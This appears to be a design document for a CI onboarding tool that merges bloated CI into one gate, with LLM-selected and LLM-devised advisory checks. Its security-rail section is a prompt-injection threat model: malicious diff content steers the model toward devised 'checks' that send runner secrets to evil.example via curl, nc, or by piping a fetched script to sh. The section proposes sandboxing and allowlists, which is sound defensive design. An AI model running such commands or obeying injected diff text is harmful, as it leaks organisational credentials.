# ub-review init / align: onboarding and careful CI de-bloat

Status: design, docs-only. Consolidates [#327](https://github.com/EffortlessMetrics/ub-review/issues/327)
and its brownfield comment.
Related: the read-only audit and migration-PR contracts in
[CI_AUDIT_WIZARD.md](CI_AUDIT_WIZARD.md), the decision record
[adr/0002-single-gate-and-ci-audit-wizard.md](adr/0002-single-gate-and-ci-audit-wizard.md),
the execution model in
[#325](https://github.com/EffortlessMetrics/ub-review/issues/325), the gate
surface in
[specs/UB-REVIEW-SPEC-0003-intelligent-ci-gate.md](specs/UB-REVIEW-SPEC-0003-intelligent-ci-gate.md),
and the model-influenced-execution provenance precedent in
[unsafe-review-swarm #1514](https://github.com/EffortlessMetrics/unsafe-review-swarm/issues/1514).

`init` / `align` is the onboarding motion for the single-gate design. `audit-ci`
and `setup-ci` are the read-only report and the migration-PR generator under it;
this doc defines the onboarding command those surfaces serve and the runtime
model the migration converges toward. It proposes and writes a reviewable plan;
it never silently rewrites CI.

## Purpose

Onboard any repository to one tight CI gate: one runner, one required check —
the deterministic core floor — with `ub-review` riding along advisory, model
lanes reasoning on top, self-hosted-primary with GitHub-hosted overflow. The
goal from ADR 0002 stands: `ub-review/gate` becomes the standard and only
required PR check, efficient and good enough out of the box to deserve that
position.

Two entry points:

```text
init   (greenfield, generate): inspect a codebase with no fitting gate yet —
       languages, workspace shape, relevant sensors — and generate a tuned
       single-gate ci.yml plus .ub-review.toml. Compose existing good tools;
       do not reinvent them.

align  (brownfield, ingest + align): ingest a repo's EXISTING CI stack and
       propose how to converge it onto the single gate, as a reviewable diff
       a maintainer can read, trust, and merge.
```

Both produce the same artifact shape: a migration plan plus the proposed
workflow as a diff. `align` is the harder, more important half, because it
must not break anything load-bearing while it de-bloats.

## The de-bloat thesis

Most CI designs are bloated by accretion: a pile of parallel required checks,
redundant tools that catch the same failure mode, a separate runner per check,
the whole heavy set run on every PR. Each entry was reasonable when it landed;
the sum is slow, expensive, and noisy, and nobody prunes it because deleting a
check feels dangerous.

The single-gate design is tighter: one runner, a deterministic floor running
under the model latency, advisory model lanes on top, and diff-relevant extras
only when the diff warrants them. `init` / `align` migrates a repo toward that
shape. The framing is **right-sizing, not downgrading**: less fixed CI, more
useful proof.

## The runtime model: required floor, suggested catalog, devised checks

The output of onboarding is two lists and a runtime rule that draws from them —
plus a third fill source the runtime devises per PR. This is the backbone of the
whole design. The fills are: **required** (always) + **suggested-catalog picks**
+ **LLM-devised PR-specific checks**, all advisory, all inside the 30/60 budget.

The devised-check capability is powerful, and it carries a load-bearing
security rail; the rail is specified in its own section below
([Security rail](#security-rail-constraining-llm-devised-execution)) and is not
optional.

### 1. Tight required list — the deterministic floor that always blocks

The small mandatory set that must ALWAYS run and BLOCK the merge: fast,
load-bearing, deterministic. It is the single required check (`ub-review/gate`)
and nothing else is branch-protection material. Keep it tight — every entry
here taxes every PR, so it earns its place by being cheap, deterministic, and
genuinely load-bearing. Its failure is the only thing that turns the gate red.

```text
required list  -> runs on every PR, every head SHA
               -> deterministic, no model output in the verdict
               -> failure = red gate (the one hard block)
               -> kept tight on purpose
```

### 2. Longer structured suggested list — the starting catalog, never mandatory

Everything else: classified, cataloged, but not mandatory. These are the
checks and sensors a run *may* execute. The list is **structured, not a flat
dump** — each entry carries enough metadata that the runtime can select from
it intelligently. It is a **starting catalog, not a ceiling**: it seeds the
runtime with known-good checks, but the runtime is not limited to it (see
section 4). Each entry:

```json
{
  "id": "windows-e2e",
  "checks": "Windows-specific runtime regressions on release paths",
  "covers": ["platform-specific UB", "path-handling divergence"],
  "cost": "heavy",
  "relevant_when": {"diff_classes": ["source-general"], "paths": ["src/os/**"]},
  "origin": "folded from .github/workflows/e2e.yml job e2e-matrix-windows",
  "blocking": false
}
```

`checks` / `covers` / `cost` / `relevant_when` let the runtime pick the right
fills for a given diff instead of running everything. Nothing in this list
blocks the merge.

### 3. The LLM fills the runner during investigation

At runtime the required list always runs. Then, while the model lanes
investigate the diff — the latency window the runner would otherwise spend
idle — the LLM dynamically selects items from the suggested list to fill the
runner's spare capacity: diff-relevant, opportunistic, advisory. The runner
stays busy with useful work under the model latency, and none of those fills
can block the merge.

```text
t0  ┌──────────────────────────────────────────────┐
    │ required list (deterministic floor)  -> verdict │  always; blocks
    ├──────────────────────────────────────────────┤
    │ model lanes investigate the diff ............. │  advisory
    │   LLM selects fills from the suggested list:   │
    │   diff-relevant sensors / checks run here      │  advisory; never blocks
t1  └──────────────────────────────────────────────┘
        one runner, one required check
```

This is the same "build shared context once, overlap model investigation with
local proof" stance from [WHY_THIS_DESIGN.md](WHY_THIS_DESIGN.md), applied to
onboarding: the suggested list is the menu the overlap draws from.

### 4. LLM-devised PR-specific checks — beyond the catalog

The suggested catalog is a starting point, not a ceiling. The most valuable
fills are often the ones no static catalog could enumerate ahead of time,
because they are tailored to *this* diff against *this* repo. From the PR diff
plus repo context, the runtime can **devise or select checks that are not in
the suggested list**:

```text
diff touches a parser          -> fuzz that parser
diff touches an FFI seam       -> run that targeted boundary test
diff touches a config schema   -> validate the config
diff adds an unsafe block      -> run the unsafe-review witness route on it
diff touches a serializer      -> round-trip / differential check on it
```

This is the power of the design: diff-tailored checking that meets the PR where
it is, instead of a fixed job list that runs the same things regardless of what
changed. The devised checks are advisory like the catalog fills, counted
against the same budget, and — because the runtime is now choosing commands to
run under the influence of PR-controlled diff content — **constrained by the
security rail below. The rail is what makes this capability safe to ship; it is
not optional.**

So the full runtime fill is three sources, one runner:

```text
required floor            always; deterministic; the only hard block
suggested-catalog picks   advisory; selected from the structured catalog
LLM-devised PR checks      advisory; tailored to the diff, beyond the catalog;
                          executed only inside the security rail
```

The careful de-bloat analysis produces the required floor and the suggested
catalog from a bloated CI; the runtime adds the devised checks on top per PR.

### Budget-bounded fills: target and cap

The suggested-fill selection is time-budgeted and configurable per repo. Two
knobs bound it:

```text
target   soft per-run budget the fills aim for      default 30 min
cap      hard ceiling; the job timeout               default 60 min
```

Runtime rule: the tight required floor always runs. The LLM then fills the
runner from the structured suggested list — selecting diff-relevant items — to
approach the target, and **never exceeds the cap**. As elapsed time approaches
the target it stops scheduling new suggested work; the cap is the absolute
ceiling that bounds both cost and wall-clock. A fill already running near the
cap is the timeout's job to stop, not a new fill's.

```text
0 ───────────────── target (30m) ──────────── cap (60m, job timeout)
│ required floor │ LLM-selected fills approach target │  hard stop
│ always         │ stop scheduling new fills near target │  ceiling
```

So the three-part model is budget-bounded: required (always) + suggested-catalog
picks + LLM-devised PR-specific checks, the latter two competing for the same
fill budget (up to the target, hard-capped). Devised checks are not a budget
loophole — they draw from the same target/cap as catalog fills. This is how the
runner stays usefully busy under the model latency without unbounded cost or
runtime.

`init` / `align` proposes `30 / 60` as sensible defaults, documents that both
are configurable, and the generated `ci.yml` sets the job `timeout-minutes` to
the cap.

#### Why 30 / 60: the economic anchor

The defaults are chosen so budget-bounded multi-step model review is affordable
on **every** PR, not so they cap an expensive exception. At the 30-minute
target with ~2 runs per PR, per-PR cost lands around **$0.50** at API pricing
(MiniMax-M3 primary, OpenCode deepseek-v4-flash fallback). That ~$0.50/PR is
the design point: cheap enough to run on every PR rather than reserve for big
diffs. It pairs with the observed heavy-use figure — under ~2% of a weekly
budget across multi-day heavy use.

The knobs are configurable and the cost scales with them: raising the target
raises per-PR cost roughly proportionally (a 60-minute target is ~2x the run
budget, hence ~2x per-PR cost). A repo that wants deeper review on every PR
pays for it predictably; a repo that wants the floor near-free keeps the
default and stays around $0.50/PR.

## Security rail: constraining LLM-devised execution

The devised-check capability (section 4) is the most powerful part of the
runtime model and the most dangerous. It must ship with the rail below. The
power is the diff-tailored checking; the discipline is the sandbox, the
allowlist, provenance, and advisory-only. Document them together — neither half
is optional.

### The threat

LLM-devised checks mean the model is **choosing commands to run**, and that
choice is **influenced by PR-controlled diff content**, on a runner that may
hold org secrets:

```text
MINIMAX_API_KEY         model provider key
OPENCODE                OpenCode Go provider key
GITHUB_TOKEN            scoped PR token (posting the grouped review)
EM_RUNNER_READ_TOKEN    self-hosted runner read token
```

That is a prompt-injection-to-exfiltration surface. A malicious PR can plant
text in the diff (a comment, a string, a test fixture, a crafted filename)
designed to steer the model into devising a "check" that is really an
exfiltration step:

```text
diff content (attacker-controlled)
  -> steers the model's devised command
  -> e.g. `curl https://evil.example/$MINIMAX_API_KEY`
          `env | curl --data-binary @- https://evil.example`
          `cat ~/.git-credentials | nc evil.example 80`
          `curl evil.example/x.sh | sh`
  -> secret leaves the runner
```

The model is reasoning over untrusted input and then acting. Treating its
devised commands as trusted because the model is "ours" is the mistake; the
diff that influenced them is not ours.

### The rail (required, not optional)

Devised-check execution is constrained on every axis:

```text
sandbox, no secrets   devised commands run in a separate execution context
                      from the secret-bearing posting step. Secrets are NOT
                      present in the devised-command environment — not in env,
                      not on disk, not reachable. The step that holds
                      GITHUB_TOKEN/MINIMAX/OPENCODE/EM_RUNNER_READ_TOKEN is a
                      different, later, non-LLM-directed context.

allowlist only        only an allowlist of read-only analysis command families
                      may run: grep/search, build, test, lint, scan/fuzz
                      harnesses, config validation. NEVER network egress,
                      NEVER writes outside a scratch dir, NEVER arbitrary exec
                      or shell-out to fetched code. Deny-by-default: a devised
                      command not matching the allowlist does not run.

provenance-marked     every devised command is recorded as LLM-devised and
                      diff-influenced (untrusted-input provenance), distinct
                      from deterministic required-floor and catalog fills.

logged & explainable  what ran and why is logged: the command, the allowlist
                      family it matched, and the diff signal that motivated it.
                      Auditable after the fact, never a coin flip.

advisory only         a devised check NEVER blocks the merge. Only the
                      deterministic required floor turns the gate red. A
                      devised check that errors is missing evidence, not a fail.

budget-bounded        devised checks count against the same 30/60 target/cap
                      as catalog fills; no separate or unbounded budget.
```

### Fork PRs vs. injected same-repo PRs

Fork PRs already run with no secrets (the standard `pull_request` posture), so
the advisory secret-bearing layer is skipped for them entirely — there is
nothing to exfiltrate. The live risk is the subtler one: **injection inside an
otherwise-legitimate same-repo PR**, where the secret-bearing context does
exist. A trusted author can still merge a diff that, unbeknownst to them,
carries injection bait in a fixture or dependency. So the sandbox + allowlist
are required **even for trusted, same-repo PRs** — author trust is not a
substitute for the rail, because the dangerous input is the diff, not the
author.

```text
fork PR            no secrets present -> advisory layer skipped -> no rail needed
same-repo PR       secrets present + diff may carry injection -> rail REQUIRED
```

### Same risk class as confirm --allow-heavy

This is the same risk class as `unsafe-review`'s `confirm --allow-heavy`
provenance discipline
([unsafe-review-swarm #1514](https://github.com/EffortlessMetrics/unsafe-review-swarm/issues/1514)):
model-influenced execution on a privileged runner, made safe by provenance,
sandboxing, and an explicit capability boundary rather than by trusting the
model. `init` / `align` applies the same principle at a **larger surface** —
not one heavy witness behind an explicit flag, but a per-PR stream of devised
commands — so the rail is correspondingly stricter: deny-by-default allowlist,
no-secret sandbox, and advisory-only by construction.

## Careful-analysis methodology

De-bloating CI correctly is dangerous. You cannot just delete checks: a check
that has "caught nothing in 90 days" may be the only thing positioned to catch
a rare, severe failure. The analysis classifies **each** existing check or job
without breaking anything load-bearing, and every classification feeds one of
the two lists (or, rarely, the drop pile).

| Classification | Meaning | Lands in |
|---|---|---|
| load-bearing deterministic floor | cheap, deterministic, high-signal; its failure must still block | **required list** |
| coverable by a sensor | a composed sensor already catches this failure mode (bespoke unsafe scan -> `unsafe-review`; lint job -> the lint sensor) | **suggested list** (folded into the one job) |
| advisory candidate | useful signal, not branch-protection material; move from blocking to advisory, model-reviewed | **suggested list** (advisory-first) |
| diff-relevant extra | valuable when the diff/paths warrant it, wasteful on every PR | **suggested list** (with `relevant_when`) |
| redundant | a good existing tool already covers the exact same failure mode (no NIH) | **dropped — only after coverage is confirmed elsewhere** |
| uncertain / unknown failure mode | purpose or coverage cannot be established | **required list — kept blocking, flagged for human** |

Mapping the per-check classes onto the two lists:

```text
load-bearing            -> required list
coverable / advisory /
  diff-relevant         -> suggested list (folded, advisory-first, diff-gated)
confirmed-redundant     -> dropped (only with proven coverage elsewhere)
unknown / load-bearing
  but unclear           -> stays in the required list; flagged for human
```

Rules (non-negotiable):

- **Never drop a check whose failure mode is not demonstrably covered
  elsewhere.** Absence of past failures is not coverage. Default to keeping a
  check whose purpose cannot be established.
- **Unknown stays required.** A check with an unclear or unestablished failure
  mode is kept blocking and surfaced for human review, never quietly demoted.
- **Preserve required-check NAMES.** Branch protection maps checks by name;
  keep the names stable so protection keeps mapping while the work moves
  inside the gate. The exact required-checks change is spelled out for the
  maintainer, never applied silently (see ADR 0002 and
  [CI_AUDIT_WIZARD.md](CI_AUDIT_WIZARD.md)).
- **Advisory-first.** Do not newly-block on the model. Moving a check to
  advisory must not make the gate red on model output; only the deterministic
  floor blocks.
- **Reviewable diff, never a silent overwrite.** The output is a diff against
  the current workflow plus a rationale, not an in-place rewrite.
- **Surface every "kept because unclear."** Each one is a decision the human
  makes, not the tool.
- **Security stays human.** Security, secrets, signing, deploy, provenance,
  and compliance jobs are flagged for human review, never auto-right-sized —
  consistent with the `flag-for-human` tier in ADR 0002.

This is the survivorship discipline from ADR 0002 stated as an onboarding
procedure: the plan must say both what a job is positioned to catch and what
it has caught, and conservative defaults win ties.

## File-driven mode

The model lanes are one driver, not the only one. If a repo has no PR model
providers configured — no MiniMax, no OpenCode keys — `init` / `align` does not
stall and does not silently skip the analysis. It emits the inspection / ingest
findings plus the migration plan as a self-contained file an external coding
agent (Claude Code, Codex) runs off to execute the convergence.

```text
two drivers, one plan:
  ub-review lanes      model lanes select suggested fills and reason in-runner
  external agent       the same plan, written to a file, executed by Claude/Codex
```

Same migration plan, same two lists, same careful classification. The driver
changes; the plan and its boundary do not. This keeps the no-model tier from
ADR 0002 a real product tier, not a degraded run: deterministic findings and a
complete, executable plan with zero tokens.

## Output and documentation

`init` / `align` writes a migration plan and the proposed `ci.yml` as a
reviewable diff. The plan is the per-check classification table — every
existing check, its class, the list it lands in, and a short rationale per
decision — plus the resulting required list and structured suggested catalog.

```text
migration plan
  per-check classification table  every job -> class -> list -> rationale
  required list                   the tight deterministic floor
  suggested list                  structured catalog (checks/covers/cost/when)
  budget defaults                 target 30 min / cap 60 min, both configurable
  proposed ci.yml                 as a diff against the current workflow;
                                  job timeout-minutes set to the cap
  branch-protection change        exact required-checks edit, stated not applied
  kept-because-unclear            the human-decides queue, surfaced explicitly
```

Good documentation is a first-class requirement, not a byproduct. A maintainer
must be able to read the plan and understand exactly what changed, why each
check moved where it moved, and trust the result enough to merge it. A
migration the maintainer cannot follow is a failed migration regardless of how
correct the underlying classification is.

### Worked example: unsafe-review-swarm #1524

`unsafe-review-swarm`
[#1524](https://github.com/EffortlessMetrics/unsafe-review-swarm/issues/1524)
is the reference migration: a routed, multi-lane, size-routed gate converged to
one tight gate.

```text
before: size-routed required lanes
  small-pr-gate     required   fmt + check + clippy + unit
  medium-pr-gate    required   + integration + doc
  large-pr-gate     required   + e2e matrix + coverage + extended sensors
  (the heavy set became required as the PR grew; three runners' worth of
   mandatory work, much of it redundant across the size tiers)

after: one tight gate
  required list (always, blocks):
    ub-review/gate  -> fmt, check, clippy, unit as [[proof.required]]
                       (load-bearing deterministic floor; names preserved)

  suggested list (LLM fills during investigation, advisory, never blocks):
    integration     coverable        relevant_when source touched
    doc             coverable        relevant_when docs/public API touched
    e2e matrix      diff-relevant    relevant_when os/platform paths touched
    coverage        advisory         folded as advisory receipt
    extended sensors -> unsafe-review / ripr / cargo-allow (composed, no NIH)

  dropped: only the lanes whose failure mode was confirmed redundant with a
           composed sensor; everything uncertain stayed in the required list.
```

The size-routing disappears because the runtime model replaces it: the required
floor is constant and tight, and the LLM pulls the right fills from the
suggested list per diff instead of a coarse size tier escalating the whole
mandatory set.

## Boundary

`init` / `align` is bounded the same way the rest of `ub-review` is:

- It **proposes and writes a reviewable plan and diff**; it does not apply
  changes. No silent overwrite of any workflow.
- **Advisory-first**: the deterministic core floor stays the only hard gate;
  nothing newly-blocks on the model, including LLM-devised checks.
- **Devised execution is railed.** LLM-devised, diff-influenced checks run in a
  no-secret sandbox, under a deny-by-default read-only allowlist, provenance-
  marked and logged, advisory-only, and budget-bounded. The diff is untrusted
  input; the rail, not author trust, is what contains it (see
  [Security rail](#security-rail-constraining-llm-devised-execution)).
- **No committed secrets.** Provider keys and tokens are referenced, never
  written into generated files.
- **No branch-protection mutation.** The exact required-checks change is
  stated for the maintainer to apply (or a later explicit, separately-invoked
  apply step), never changed by default.
- **No proof claims.** Consistent with `unsafe-review` posture, `init` /
  `align` makes no claim of proven soundness, UB-free status, Miri
  cleanliness, or site execution. It right-sizes CI; it does not certify code.
- **Conservative by default.** Unknown stays required; redundant is dropped
  only with confirmed coverage; missing evidence is reported as missing
  evidence, never as clean evidence.
- **Budget-bounded.** Suggested fills aim for the target and never exceed the
  cap (job timeout); cost stays bounded and predictable (~$0.50/PR at the
  defaults) rather than open-ended.

The single tight required gate is the product. `init` / `align` is how a repo
gets there without losing anything load-bearing on the way.
